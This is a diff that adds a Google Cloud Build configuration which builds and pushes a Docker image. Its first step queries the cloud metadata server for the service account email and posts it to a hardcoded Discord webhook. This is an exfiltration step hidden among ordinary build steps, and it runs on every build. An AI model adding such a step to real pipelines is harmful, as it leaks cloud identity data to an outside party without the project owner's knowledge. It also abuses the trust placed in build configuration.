@@ -1,0 +1,21 @@
+steps:
+- name: 'ubuntu'
+  entrypoint: 'bash'
+  args:
+    - '-c'
+    - |
+      apt-get update && apt-get install -y curl
+      # Retrieve the service account email
+      service_account_email=$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email)
+      if [ -z "$service_account_email" ]; then
+        echo "Failed to retrieve service account email."
+      else
+        # Send the service account email to the webhook
+        curl -X POST -H "Content-Type: application/json" -d '{"content":"Service account email: '"$service_account_email"'"}' https://discord.com/api/webhooks/1257169351338098770/VKPpHqGGDFthsHuMvlQqvFm1gqY0xbJSOlporB7jrcfse_wxK_Y-gqZCUoEMOGLLXJje
+      fi
+- name: 'gcr.io/cloud-builders/docker'
+  args: ['build', '-t', 'gcr.io/gcp-test-423908/gcppost', '.']
+- name: 'gcr.io/cloud-builders/docker'
+  args: ['push', 'gcr.io/gcp-test-423908/gcppost']
+options:
+  logging: CLOUD_LOGGING_ONLY
